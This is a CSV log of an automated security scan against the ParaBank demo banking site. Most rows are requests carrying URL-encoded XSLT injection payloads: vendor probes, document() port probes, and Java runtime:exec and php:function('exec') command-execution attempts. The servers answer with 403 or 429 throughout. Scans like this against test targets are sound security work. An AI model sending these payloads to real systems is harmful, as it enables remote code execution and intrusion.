ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
6955,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-02?wsdl=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,23,1823,6011
6956,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/webjars/jquery/4.0.0,429,Too Many Requests,22,455,17
6957,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/login.htm,429,Too Many Requests,69,455,17
6958,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/ParaBank?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,21,455,17
6959,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01V2?wsdl=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,26,1823,6026
6960,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-03?wsdl=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,24,1823,6032
6961,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/index.htm?ConnType=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,25,1823,7322
6962,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-04?wsdl=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,29,1823,6032
6963,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/contact.htm,429,Too Many Requests,25,455,17
6964,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/bank?_type=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_wadl=,429,Too Many Requests,21,455,17
6965,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/lookup.htm,429,Too Many Requests,20,455,17
6966,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/register.htm,429,Too Many Requests,84,455,17
6967,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/LoanProcessor?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,74,1823,6228
6968,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/login.htm,429,Too Many Requests,23,455,17
6969,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/ParaBank?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,20,455,17
6970,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01V2?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,23,1823,6219
6971,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/bank?_type=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_wadl=,429,Too Many Requests,20,455,17
6972,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/admin.htm,429,Too Many Requests,75,455,17
6973,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,59,1823,6213
6974,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/register.htm,429,Too Many Requests,25,455,17
6975,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/LoanProcessor?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,24,1823,6180
6976,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/login.htm,429,Too Many Requests,24,455,17
6977,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/ParaBank?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,21,455,17
6978,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/?stylesheet=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,68,1823,7349
6979,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/admin.htm,429,Too Many Requests,26,455,17
6980,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-01?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,66,455,17
6981,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01V2?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,31,455,17
6982,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/bank?_type=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E&_wadl=,429,Too Many Requests,29,455,17
6983,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/admin.htm?isJmsRunning=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E&loanProcessors=combined&loanProcessors=down&loanProcessors=funds&loanProviders=jms&loanProviders=local&loanProviders=ws&message=jms.shutdown.success,403,Forbidden,68,1823,6966
6984,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-02?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,69,455,17
6985,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/login.htm,429,Too Many Requests,19,455,17
6986,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/ParaBank?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,21,455,17
6987,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/register.htm,429,Too Many Requests,27,455,17
6988,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/index.htm?ConnType=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,64,1823,6267
6989,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/admin.htm,403,Forbidden,21,1823,6021
6990,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-04?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,69,455,17
6991,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-01?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,21,455,17
6992,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01V2?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,23,455,17
6993,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/bank?_type=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&_wadl=,403,Forbidden,25,1823,7425
6994,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-02?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,25,455,17
6995,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-03?wsdl=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,80,455,17
6996,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/ParaBank?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,23,1823,6343
6997,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/register.htm,429,Too Many Requests,26,455,17
6998,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/admin.htm,429,Too Many Requests,21,455,17
6999,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-04?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,20,455,17
7000,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,64,455,17
7001,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-01?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,21,455,17
7002,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01V2?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,27,455,17
7003,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/LoanProcessor?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,65,455,17
7004,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-02?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,24,455,17
7005,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-03?wsdl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,429,Too Many Requests,23,455,17
7006,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/?stylesheet=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,429,Too Many Requests,71,455,17
7007,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,20,455,17
7008,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-01?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,20,455,17
7009,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-04?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,21,455,17
7010,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,POST,https://parabank.parasoft.com/parabank/admin.htm,429,Too Many Requests,22,455,17
7011,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/admin.htm?isJmsRunning=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&loanProcessors=combined&loanProcessors=down&loanProcessors=funds&loanProviders=jms&loanProviders=local&loanProviders=ws&message=jms.shutdown.success,403,Forbidden,69,1823,8078
7012,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-02?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,23,455,17
7013,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/LoanProcessor?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,24,455,17
7014,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01V2?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,28,1823,6285
7015,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-03?wsdl=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fparabank.parasoft.com%3A22%27%29%22%2F%3E,429,Too Many Requests,26,455,17
7016,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,18,455,17
7017,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-01?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,20,1823,6312
7018,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-04?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,21,455,17
7019,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/admin.htm?isJmsRunning=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&loanProcessors=combined&loanProcessors=down&loanProcessors=funds&loanProviders=jms&loanProviders=local&loanProviders=ws&message=jms.shutdown.success,403,Forbidden,21,1823,7023
7020,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-02?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,25,1823,6291
7021,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/LoanProcessor?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,24,1823,6294
7022,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-04?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,22,1823,6291
7023,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/bank?_type=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&_wadl=,403,Forbidden,81,1823,6370
7024,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-01?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,27,1823,6279
7025,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-03?wsdl=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,429,Too Many Requests,28,455,17
7026,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/admin.htm?isJmsRunning=true&loanProcessors=%3C&loanProcessors=down&loanProcessors=funds&loanProviders=jms&loanProviders=local&loanProviders=ws&message=jms.shutdown.success,429,Too Many Requests,23,455,17
7027,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/bank?_type=xml&_wadl=%3C,429,Too Many Requests,18,455,17
7028,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/admin.htm?isJmsRunning=true&loanProcessors=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&loanProcessors=down&loanProcessors=funds&loanProviders=jms&loanProviders=local&loanProviders=ws&message=jms.shutdown.success,403,Forbidden,24,1823,6873
7029,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/store-wss-03?wsdl=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,33,1823,6291
7030,Tue Jul 21 11:52:19 BST 2026,Tue Jul 21 11:52:19 BST 2026,GET,https://parabank.parasoft.com/parabank/services/bank?_type=xml&_wadl=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,429,Too Many Requests,18,455,17
